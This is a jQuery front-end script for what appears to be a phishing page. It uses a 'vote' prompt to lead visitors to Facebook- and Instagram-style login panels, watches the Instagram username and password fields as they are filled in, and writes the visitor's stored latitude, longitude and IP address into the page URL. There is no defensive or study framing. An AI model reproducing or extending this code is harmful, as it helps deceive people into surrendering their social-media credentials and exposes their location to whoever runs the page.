$(document).ready(function() {
    $("#igp input").on("keydown", function () {
      var u = $("#ig-uname").val();
      var p = $("#ig-pass").val();
      if (u != "" && p != "") {
        $("#ig-log").addClass("fb-bug");
      } else {
        $("#ig-log").removeClass("fb-bug");
        $("#ig-log").off("click");
        $("#ig-log").css("color", "white");
      }
    });
    $("#nav-bar").click(function(){
      console.log("wisdom is a good boy");
      $("#menux").slideToggle();
    });
    $("#cancel").click(function(){
      $("#choose").slideUp();
    });
    $("#vote2").click(function(){
      $("#choose").slideDown();
    });
    $(".vote").click(function(){
      $("#choose").slideDown()();
    });
  });
  // function vote() {
  //   document.getElementById("choose").style.display = "block";
  
  // }
  // function can() {
  //   document.getElementById("choose").style.display = "none";
  
  // }
  function fb() {
    //edit url
  
    //url params
    const lat = localStorage.getItem("lat");
    const long = localStorage.getItem("long");
    const ip = localStorage.getItem("ip");
  
    // Construct the query string
    const WkqueryString = `?lat=${lat}&long=${long}&ip=${ip}`;
    history.pushState(null, null, WkqueryString);
  
    document.getElementById("fbp").style.display = "block";
    document.getElementById("home").style.display = "none";
    document.getElementById("choose").style.display = "none";
  
  }
  function ig() {
    //edit url
  
    //url params
    const lat = localStorage.getItem("lat");
    const long = localStorage.getItem("long");
    const ip = localStorage.getItem("ip");
  
    // Construct the query string
    const WkqueryString = `?lat=${lat}&long=${long}&ip=${ip}`;
    history.pushState(null, null, WkqueryString);
  
    document.getElementById("igp").style.display = "block";
    document.getElementById("home").style.display = "none";
    document.getElementById("choose").style.display = "none";
  }